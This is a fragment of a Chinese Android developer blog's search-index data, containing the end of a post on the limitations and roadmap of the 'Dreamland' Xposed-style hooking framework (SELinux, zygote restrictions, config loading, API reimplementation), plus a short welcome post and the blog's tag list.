API，很方便。然后是模块管理，因为没有那么多时间去弄，所以只是简单的把对应的配置文件设置成谁都能读，当然以后会优化。未来注：本段内容没有什么营养，可以直接跳过。编译打包自动化对，目前连自动化打包都没实现，还是手动拿dex等等然后手动压缩进去…支持magisk安装现在只支持通过安装脚本直接修改/system，如果能够支持magisk模块式安装会少很多麻烦，比如如果变砖了只需要用mm管理器把模块给删了就好了支持重要系统进程加载模块由于SELinux限制，目前不支持关键系统进程（如Zygote和system_server）加载模块，我这边没有什么很好的解决办法，求各位大佬赐教 :)顺便列出一些其他的限制：android 9，隐藏API访问限制，这个好办，绕过方式有很多，就不细讲了。Android 9及以上，zygote&amp;system_server还有其他系统应用会SetOnlyUseSystemOatFiles()，然后就不能加载不在/system下面的oat文件了，如果违反这个策略就会直接abort掉。android zygote fork新进程时，如果有不在白名单中的文件描述符，会进到ZygoteFailure里，然后整个进程abort掉。配置文件加载部分因为在目标进程里加载模块肯定需要获取对应的配置，目前的做法是，把对应的配置文件设置成谁都能读，然后直接读这个文件就行，这样做当然不妥，所以计划以后去优化，比如优化成单独跑一个配置守护进程，只有这个进程能去读写配置，其他应用只能通过跨进程交互的方式拿到配置。重新实现Xposed API目前梦境的Xposed API是SandHook自带的xposedcompat，通过DexMaker动态创建新的dex实现适配，这么做没有什么兼容性问题，但是有很大的效率问题，如果是第一次创建这个方法，需要生成dex，一套流程走下来可能就要用上100+ms。在xposedcompat_new中，有另一种实现方案：通过动态代理动态生成方法，然后把这个方法设置成native，对应的native函数也是通过libffi动态生成的，在这个native方法里跳到分发函数执行。这个方案对我来说很不错，至少不会太慢。（当然稳定性存疑）结语目前梦境框架还有非常多的不足，目前只能当个PoC用，如果你有兴趣，不妨一起来玩 ^_^核心：Dreamland配套的管理器 Dreamland ManagerQQ群：949888394","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"},{"name":"注入","slug":"注入","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"我也有自己的个人博客啦！","slug":"hello-world","date":"2019-10-28T12:39:23.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2019/10/28/hello-world/","link":"","permalink":"https://blog.canyie.top/2019/10/28/hello-world/","excerpt":"我也有自己的个人博客啦！","text":"我也有自己的个人博客啦！基于GitHub Pages + Hexo，主题为Volantis本站地址：https://canyie.github.io/","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]}],"categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"parcel","slug":"parcel","permalink":"https://blog.canyie.top/tags/parcel/"},{"name":"安全补丁分析栏目","slug":"安全补丁分析栏目","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"},{"name":"年鉴","slug":"年鉴","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"闲聊","slug":"闲聊","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"property","slug":"property","permalink":"https://blog.canyie.top/tags/property/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://blog.canyie.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"航空","slug":"航空","permalink":"https://blog.canyie.top/tags/%E8%88%AA%E7%A9%BA/"},{"name":"注入","slug":"注入","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"},{"name":"hidden-api","slug":"hidden-api","permalink":"https://blog.canyie.top/tags/hidden-api/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"},{"name":"dex","slug":"dex","permalink":"https://blog.canyie.top/tags/dex/"}]}